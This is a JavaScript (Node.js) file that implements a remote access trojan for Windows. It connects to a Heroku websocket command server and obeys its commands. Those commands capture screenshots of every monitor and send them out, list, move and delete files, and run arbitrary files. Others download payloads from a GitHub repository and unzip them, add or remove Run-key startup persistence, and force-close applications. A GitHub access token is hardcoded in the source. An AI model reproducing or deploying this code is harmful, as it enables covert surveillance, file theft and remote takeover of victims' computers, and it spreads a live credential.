const fs = require('fs-extra'); 
const path = require('path');
const WebSocket = require('ws');
const screenshot = require('screenshot-desktop');
const axios = require('axios').default; 
const ADMZip = require('adm-zip');
const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);

const GITHUB_TOKEN = "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";
const HEARTBEAT_INTERVAL = 30000; // 30 seconds

function sendMessage(ws, action, data = {}) {
    const message = JSON.stringify({ action, ...data });
    ws.send(message);
}

const connectWebSocket = async () => {
    let ws;
    let heartbeatInterval;

    const heartbeat = () => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        }
    };

    const connect = () => {
        ws = new WebSocket('wss://my-websocket-server-9d06eb46073e.herokuapp.com');

        ws.on('open', () => {
            sendMessage(ws, 'capture connected');
            heartbeatInterval = setInterval(heartbeat, HEARTBEAT_INTERVAL);
        });

        ws.on('pong', () => {
            console.log('Received pong from server');
        });

        ws.on('close', () => {
            clearInterval(heartbeatInterval);
            setTimeout(connect, 5000);
        });

        ws.on('error', (error) => {
            console.error('WebSocket error:', error);
            ws.close();
        });

        ws.on('message', async (message) => {
            const command = JSON.parse(message);
            try {
                switch (command.action) {
                    case "scan_path": 
                        await scanAndSendItems(command.path, ws); 
                        break;
                    case "move_item": 
                        await moveItem(command.sourcePath, command.destinationPath, ws); 
                        break;
                    case "download_file": 
                        await downloadFile(command.filename, command.savePath, ws); 
                        break;
                    case "delete_item": 
                        await deleteItem(command.path, ws); 
                        break;
                    case "add_to_registry": 
                        await addToRegistry(command.fileName, command.filePath, ws); 
                        break;
                    case "remove_from_registry": 
                        await removeFromRegistry(command.fileName, ws); 
                        break;
                    case "take_screenshot1": 
                        await takeScreenshot(ws); 
                        break;
                    case "close_application": 
                        await closeApplication(command.appName, ws); 
                        break;
                    case "execute_file":
                        await executeFile(command.filePath, ws);
                        break;
                    default: 
                        break;
                }
            } catch (error) {
                sendMessage(ws, "error", { message: error.message });
                console.error(`Error processing command ${command.action}:`, error);
            }
        });
    };

    connect();
};

async function executeFile(filePath, ws) {
    try {
        const { stdout, stderr } = await execPromise(`"${filePath}"`);
        if (stderr) {
            throw new Error(stderr);
        }
        sendMessage(ws, "execution_result", { message: `File executed successfully: ${stdout}` });
    } catch (error) {
        sendMessage(ws, "error", { message: `Error executing file: ${error.message}` });
    }
}

async function takeScreenshot(ws) {
    try {
        const imgs = await screenshot.all();
        imgs.forEach((imgBuffer, index) => {
            const imgBase64 = imgBuffer.toString('base64');
            sendMessage(ws, "screenshot_result", { screen: index, data: imgBase64 });
        });
    } catch (err) {
        sendMessage(ws, "error", { message: 'Capture Error', error: err.message });
    }
}

async function addToRegistry(fileName, filePath, ws) {
    const cmd = `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "${fileName}" /d "\\"${filePath}\\""`;

    try {
        const { stdout, stderr } = await execPromise(cmd);
        if (stderr) {
            throw new Error(stderr);
        }
        sendMessage(ws, "success", { message: `${fileName} đã được thêm vào khởi động cùng Windows.` });
    } catch (error) {
        sendMessage(ws, "error", { message: `Error: ${error.message}` });
    }
}

async function closeApplication(appName, ws) {
    const cmd = `taskkill /IM "${appName}" /F`;

    try {
        const { stdout, stderr } = await execPromise(cmd);
        if (stderr) {
            throw new Error(stderr);
        }
        sendMessage(ws, "success", { message: `${appName} đã được đóng thành công.` });
    } catch (error) {
        sendMessage(ws, "error", { message: `Lỗi khi đóng ứng dụng ${appName}: ${error.message}` });
    }
}

async function deleteItem(itemPath, ws) {
    try {
        await fs.remove(itemPath);
        sendMessage(ws, "delete_result", { message: "Item deleted successfully" });
    } catch (err) {
        sendMessage(ws, "error", { message: "Error deleting item", error: err.message });
    }
}

async function removeFromRegistry(fileName, ws) {
    const cmd = `reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "${fileName}" /f`;

    try {
        const { stdout, stderr } = await execPromise(cmd);
        if (stderr) {
            throw new Error(stderr);
        }
        sendMessage(ws, "success", { message: `${fileName} đã được xóa khỏi khởi động cùng Windows.` });
    } catch (error) {
        sendMessage(ws, "error", { message: `Error: ${error.message}` });
    }
}

async function downloadFile(filename, savePath, ws) {
    const fileUrl = `https://api.github.com/repos/cocolaton1/cocolate/contents/${filename}`;
    try {
        const metaResponse = await axios.get(fileUrl, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });

        const response = await axios.get(metaResponse.data.download_url, {
            responseType: 'arraybuffer',
            headers: { 'Authorization': `Bearer ${GITHUB_TOKEN}` },
            timeout: 10000 // 10 seconds timeout
        });

        await fs.ensureDir(savePath);
        const filePath = path.join(savePath, filename);
        await fs.writeFile(filePath, response.data);

        if (filename.endsWith('.zip')) {
            const zip = new ADMZip(filePath);
            zip.extractAllTo(savePath, true);
            sendMessage(ws, "download_result", { message: "File downloaded and extracted successfully" });
        } else {
            sendMessage(ws, "download_result", { message: "File downloaded successfully" });
        }
    } catch (error) {
        sendMessage(ws, "error", { message: "Error downloading file", error: error.message });
    }
}

async function moveItem(sourcePath, destinationPath, ws) {
    try {
        const destinationStat = await fs.stat(destinationPath).catch(err => null);

        let finalDestinationPath = destinationPath;
        if (destinationStat && destinationStat.isDirectory()) {
            const filename = path.basename(sourcePath);
            finalDestinationPath = path.join(destinationPath, filename);
        }

        await fs.move(sourcePath, finalDestinationPath, { overwrite: true });
        sendMessage(ws, "move_result", { message: "Item moved successfully" });
    } catch (err) {
        sendMessage(ws, "error", { message: "Error moving item", error: err.message });
    }
}

async function scanAndSendItems(sourcePath, ws) {
    try {
        const items = await fs.promises.readdir(sourcePath, { withFileTypes: true });
        const directoryItems = items.map(dirent => ({
            name: dirent.name,
            type: dirent.isDirectory() ? "directory" : "file"
        }));
        sendMessage(ws, "scan_result", { items: directoryItems });
    } catch (err) {
        sendMessage(ws, "error", { message: "Error scanning directory", error: err.message });
    }
}

connectWebSocket();
